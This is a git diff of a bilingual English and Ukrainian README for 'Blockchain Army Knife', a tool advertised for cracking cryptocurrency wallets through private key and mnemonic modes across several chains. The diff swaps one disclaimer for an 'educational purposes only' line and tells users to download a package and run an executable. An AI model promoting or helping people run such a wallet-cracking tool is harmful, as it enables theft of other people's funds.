@@ -7,11 +7,9 @@
 ## Introduction/Ввод ##
 
 🚩Blockchain Army Knife is a blockchain wallet cracking tool that supports multiple chains, including BTC/ETH/BSC/POLYGON/LTC/TRON. The software provides functions such as private key mode, mnemonic mode, single target mode, and mixed target mode
-This software is for technical verification only and may not be used for illegal purposes
 
 
 🚩Blockchain Army Knife — це інструмент крекування паричників блокchain, який підтримує декілька ланцюгів, зокрема BTC/ETH/BSC/POLYGON/LTC/TRON. Програмне забезпечення надає функції, зокрема режим приватного ключа, режим менемонії, режим одного призначення і режим мішаного призначення
-Цей програмний забезпечення використовується лише для технічної перевірки і не може бути використано для незаконних мет
 
 
 ## Function/Функція ##
@@ -51,5 +49,7 @@ Please refer to the user manual for detailed function usage methods
 🚩Звантажити пакунок встановлення, вилучити його до будь- якого файла, заповнити файл параметрів у текі параметрів і двічі клацніть на BlockchainArmyKnife.exe, щоб запустити програму
 Будь ласка, перегляньте підручник користувача для детальних методів використання функцій
 
+
+This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. Educational purpose only!
 
 contact:LanceHez@proton.me
